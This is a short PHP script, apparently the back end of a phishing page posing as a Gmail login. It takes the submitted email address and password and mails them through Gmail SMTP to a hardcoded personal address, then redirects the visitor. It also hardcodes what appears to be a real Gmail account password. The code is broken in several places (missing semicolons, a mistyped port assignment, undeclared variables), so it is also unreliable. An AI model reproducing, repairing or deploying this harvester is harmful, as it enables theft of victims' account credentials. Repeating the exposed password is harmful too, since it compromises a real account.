<?php

session_start();

require_once 'libs/phpmailer/PHPMailerAutoload.php'

$errors = [];



if(isset($_POST['Email'], $_POST['password'])) {
	$fields = [
	'name' => $_POST['Email'],
	'email' => $_POST['password'],
];

foreach($fields as $field => $data) {
	if(empty(data)) {
	$errors[] = 'The ' . $field . 'field is required.';

	}
}


if(empty($errors)) {
	$m = new PHPMailer;

	$m->isSMTP();
	$m->SMTPAuth = true;



	$m->Host = 'smtp.gmail.com';
	$m->Username = 'maxwellmccormack@gmail.com';
	$m->Password = 'Snakeking2';
	$m->SMTPSecure = 'ssl';
	$m->Port - 456;

	$m->isHTML

	$m->subject = 'form';
	$m->Body = 'From: '  . $fields['name'] .  ' ('  . $fields['email'] .  ')<p>'  . $fields["message"] .  '</p>';

	$m->FromName = 'Contact';

	$m->AddAddress('maxwellmccormack@gmail.com',  'Alex Garrett');

	if($m->send()) {
		header('Location: thanks.php');
		die();
	} else {
	errors[] = 'sorry, could not send.';
	}
}


} else {
	$errors[] = 'Something went wrong.';
}

$_SESSION['errors'] = $errors;
$_SESSION['fields'] = $fields;

header('location: gmail.php');